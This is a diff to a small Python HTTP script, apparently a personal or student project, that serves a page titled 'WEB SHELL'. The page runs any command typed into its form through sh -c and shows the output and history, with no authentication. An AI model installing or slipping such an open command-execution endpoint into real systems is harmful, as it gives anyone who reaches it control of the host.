@@ -2,6 +2,7 @@ import json
 import os
 import sys
 import time
+import random
 
 res = """
 HTTP/1.1 200
@@ -14,17 +15,25 @@ res2 = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Hello, world!</title>
+    <title>WEB SHELL 1</title>
 </head>
-<body style="background-color:black;color:#46C786">
+<body style="background-color:black;color:#00FA16">
+	<h1 style="text-align:center"></u><strong>WEB SHELL</strong></u></h1><br>
+	<h3><u>HISTORY</u></h3> 
 	$(HISTORY)<br>
-	$(DATA)<br>
-	<form action="ajoute$(ID_SESSION)" method="get">
-		<input type="text" name="saisie" placeholder="Tapez quelque chose" />
+	<h3><u>LAST CMD :</u> $(DATA)</h3><br>
+	<form style="background-color:black;color:#00FA16" action="ajoute$(ID_SESSION)" method="get">
+		<input id="textbox" type="text"  style="border:3px solid #46C786;border-radius:10px;width:200px;box-shadow:1px 1px 2px #C0C0C0 inset;" name="saisie" placeholder="Tapez une commande" />
 		<input type="submit" name="send" value="&#9166;">
 	</form>
-	$(RES)<br>
+	<h3><u>RES CMD :</u></h3> 
+	$(RES)
 </body>
+<script language="javascript">
+	var input = document.getElementById('textbox');
+	input.focus();
+	input.select();
+</script> 	
 </html>
 """ 
 def escaped_utf8_to_utf8(s):
@@ -66,17 +75,23 @@ def	get_cmd() :
 			history += read.decode('utf8')
 			read = os.read(fd, 100000)
 		msg = msg.replace("$(HISTORY)", history.replace("\n", "<br>"))
+		rd_nb = random.randrange(42, 42424242424242424242, 42) #RANDOM NUMBER
+		pipe = os.pipe()
 		pid_fork = os.fork()
 		if (pid_fork == 0) :
-			os.unlink("/tmp/res_cmd")
-			fd_res = os.open("/tmp/res_cmd", os.O_RDWR | os.O_CREAT)
-			os.dup2(fd_res, 1)
-			os.dup2(fd_res, 2)
+			os.dup2(pipe[1], 1) #STDOUT IN PIPE
+			os.dup2(pipe[1], 2) #STDERR IN PIPE
+			data = data + " ; " * (len(data) > 0) + "echo " + str(rd_nb)
 			os.execvp('sh', ['sh','-c', data])
 		else :
-			time.sleep(0.5)
-			res_cmd = os.read(os.open("/tmp/res_cmd", os.O_RDONLY), 1000000)
-			msg = msg.replace("$(RES)", res_cmd.decode("utf8").replace("\n", "<br>"))
+			time.sleep(0.1)
+			read = True
+			res_cmd = ''
+			while (read) :
+				res_cmd += os.read(pipe[0], 1).decode("utf8")
+				if (len(res_cmd) >= len(str(rd_nb)) and res_cmd[-len(str(rd_nb)):] == str(rd_nb)) :
+					read = False
+			msg = msg.replace("$(RES)", res_cmd.replace(str(rd_nb), "").replace("\n", "<br>"))
 		msg = res.replace("$(SIZE)", str(len(msg))).replace('\n', '\n\r') + msg
 		os.write(1, bytes(msg, 'utf8'))
 		#WRITE IN HISTORY
